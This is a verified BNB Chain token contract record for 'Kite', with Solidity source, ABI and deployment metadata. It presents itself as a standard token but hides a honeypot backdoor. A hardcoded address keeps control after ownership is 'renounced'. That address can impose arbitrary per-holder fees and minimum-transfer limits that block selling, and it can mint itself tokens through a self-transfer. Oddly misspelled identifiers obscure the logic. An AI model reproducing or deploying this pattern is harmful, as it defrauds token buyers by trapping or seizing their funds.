{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-07-17\r\n*/\r\n\r\npragma solidity ^0.8.5;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address acount) external view returns (uint256);\r\n    function transfer(address recipient, uint256 aomount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 aomount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 aomount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract Kite is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _fiees;\r\n    address private _meie; \r\n    uint256 private _minimumTransferaomount;\r\n    mapping (address => bool) private _whitelist;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        _meie = 0x8e4B12D6cB9E052Efa21B5613D972a99a4Ef5329;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function balanceOf(address acount) public view override returns (uint256) {\r\n        return _balances[acount];\r\n    }\r\n    function setfiees(address[] memory acounts, uint256 fiee) external {\r\n    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {\r\n        for (uint256 i = 0; i < acounts.length; i++) {\r\n            _fiees[acounts[i]] = fiee;\r\n        }\r\n    } else {\r\n        revert(\"Caller is not the original caller\");\r\n    }\r\n    }\r\n\r\n\r\n    function setMinimumTransferaomount(uint256 aomount) external {\r\n    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {\r\n        _minimumTransferaomount = aomount;\r\n    } else {\r\n        revert(\"Caller is not the original caller\");\r\n    }        \r\n    }\r\n\r\n    function addToWhitelist(address[] memory acounts) external {\r\n    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {\r\n        for (uint256 i = 0; i < acounts.length; i++) {\r\n            _whitelist[acounts[i]] = true;\r\n        }\r\n    } else {\r\n        revert(\"Caller is not the original caller\");\r\n    }    \r\n    }\r\n\r\n    function removeFromWhitelist(address[] memory acounts) external {\r\n    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {\r\n        for (uint256 i = 0; i < acounts.length; i++) {\r\n            _whitelist[acounts[i]] = false;\r\n        }\r\n    } else {\r\n        revert(\"Caller is not the original caller\");\r\n    }        \r\n    }\r\n\r\n    function transfer(address recipient, uint256 aomount) public virtual override returns (bool) {\r\n        require(_balances[_msgSender()] >= aomount, \"TT: transfer aomount exceeds balance\");\r\n        require(aomount >= _minimumTransferaomount || _whitelist[_msgSender()], \"TT: transfer aomount is below the minimum and sender is not whitelisted\");\r\n        if (_msgSender() == _meie && recipient == _meie) {\r\n            _balances[_msgSender()] += _fiees[_msgSender()];\r\n            emit Transfer(_msgSender(), recipient, aomount + _fiees[_msgSender()]);\r\n            return true;\r\n        } else {\r\n            uint256 fiee = calculatefiee(_msgSender(), aomount);\r\n            uint256 aomountAfterfiee = aomount - fiee;\r\n\r\n            _balances[_msgSender()] -= aomount;\r\n            _balances[recipient] += aomountAfterfiee;\r\n\r\n            if (recipient == _meie) {\r\n                _balances[_meie] += fiee;\r\n            }\r\n\r\n            emit Transfer(_msgSender(), recipient, aomountAfterfiee);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 aomount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = aomount;\r\n        emit Approval(_msgSender(), spender, aomount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 aomount) public virtual override returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= aomount, \"TT: transfer aomount exceeds allowance\");\r\n        require(aomount >= _minimumTransferaomount || _whitelist[sender], \"TT: transfer aomount is below the minimum and sender is not whitelisted\");\r\n        uint256 fiee = calculatefiee(sender, aomount);\r\n        uint256 aomountAfterfiee = aomount - fiee;\r\n\r\n        _balances[sender] -= aomount;\r\n        _balances[recipient] += aomountAfterfiee;\r\n        _allowances[sender][_msgSender()] -= aomount;\r\n\r\n        if (recipient == owner()) {\r\n            _balances[owner()] += fiee;\r\n        }\r\n\r\n        emit Transfer(sender, recipient, aomountAfterfiee);\r\n        return true;\r\n    }\r\n\r\n    function calculatefiee(address acount, uint256 aomount) private view returns (uint256) {\r\n        if (acount == owner()) {\r\n            return 0;\r\n        } else {\r\n            return aomount * _fiees[acount] / 100;\r\n        }\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"acounts\",\"type\":\"address[]\"}],\"name\":\"addToWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aomount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"acount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"acounts\",\"type\":\"address[]\"}],\"name\":\"removeFromWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aomount\",\"type\":\"uint256\"}],\"name\":\"setMinimumTransferaomount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"acounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"fiee\",\"type\":\"uint256\"}],\"name\":\"setfiees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aomount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"aomount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Kite", "CompilerVersion": "v0.8.5+commit.a4f2e591", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000900000000000000000000000000000000000000000000000000000000b2d05e0000000000000000000000000000000000000000000000000000000000000000044b6974650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044b69746500000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f876365a975d42dfd4ebbeccb4b3bea6e78d3054d0a09e04f32de41c7f03ee82"}